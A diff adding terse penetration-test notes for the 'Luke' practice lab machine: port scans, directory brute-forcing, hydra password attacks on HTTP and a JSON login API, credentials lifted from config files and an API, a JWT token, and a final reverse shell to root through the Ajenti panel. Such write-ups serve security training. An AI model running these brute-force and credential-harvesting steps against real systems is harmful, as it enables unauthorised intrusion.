@@ -1,0 +1,108 @@
+# Recon
+## comm tcp
+21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to 10.10.14.7
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session upload bandwidth limit
+|      No session download bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
+|_End of status
+22/tcp   open  ssh?
+|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
+80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
+|_http-title: Luke
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+8000/tcp open  http    Ajenti http control panel
+|_http-title: Ajenti
+
+## all tcp
+same
+
+# Enum
+## 21 FTP
+searchsploit no version match
+anonymous login => get for_Chihiro.txt
+it is a message from derry to chihiro. Derry puts the source code of the website somewhere.
+
+hydra -I -V -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt 10.10.10.137 http-get /management
+
+## 80 http
+webpage.
+
+gobuster=>
+/memeber/ => dir list, but empty.
+/management/ => need http authentication
+/login.php
+/config.php => 
+$dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $db = "login"; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error); 
+=> tried with Ajenti on 8000, no.
+=> tried with login.php and chihiro, derry, no
+
+### /login.php
+bf /login.php, no
+
+### /management
+bf /management, no
+tried the creds from 3000/users => Derry is ok.
+/management/login.php => another login page.
+/management/config.json => root:KpMasng6S5EtTy9Z => ajenti ok.
+
+## 3000 http
+json, "auth token is not supported.", guess it is an API.
+gobuster=>
+/login/ => "please auth"
+/users/, need auth
+
+/login, tried post with {"username":"admin", "password":"admin"} => forbidden
+with {"username":"admin", "hahaha":"admin"} => bad request, thus previous one must have right format.
+created my own users.txt and password.txt
+hydra -I -V -L users.txt -P pass.txt luke.htb -s 3000 http-form-post '/login:{"username"\:"^USER^", "password"\:"^PASS^"}:F=Forbidden:H=Content-Type\: application/json'
+=> admin:Zk6heYCyv6ZE9Xcg
+
+returns=>
+{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTkzNTkyNjE1LCJleHAiOjE1OTM2NzkwMTV9.qajsWLZ4p8ljjycyD-_ImqzO9T_Ek1qCZZds6G_HZqU"}
+
+The token has three parts and base64 encoded. First part shows JWT.
+google and found this https://stormpath.com/blog/where-to-store-your-jwts-cookies-vs-html5-web-storage => store it in header =>
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTkzNjIxNTMzLCJleHAiOjE1OTM3MDc5MzN9.cO5pyLBJiUGDSx9dwU5vjdU7cRPsLlwj6sYJ_Ey9se4
+
+visit 3000/users => 
+[{"ID":"1","name":"Admin","Role":"Superuser"},
+{"ID":"2","name":"Derry","Role":"Web Admin"},
+{"ID":"3","name":"Yuri","Role":"Beta Tester"},
+{"ID":"4","name":"Dory","Role":"Supporter"}]
+
+so we got new names. Save to users.txt.
+
+gobuster /users => /admin => get his password
+suddenly realized that this is user's name, query /users/derry and others =>
+{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
+{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
+{"name":"Yuri","password":"bet@tester87"}
+{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
+save to users.txt and pass.txt
+no chihiro nor root.
+
+## 8000 Ajenti
+ajenti, a web admin tool, a login page.
+found exploit 2.1.31, it needs https while ours is http. Tried to visit via http, failed. 404.
+google, default user is root, password is system user root's password.
+
+with the password from 80, ok, root:KpMasng6S5EtTy9Z.
+
+# Root
+with Ajenti, terminal, rev shell => root.
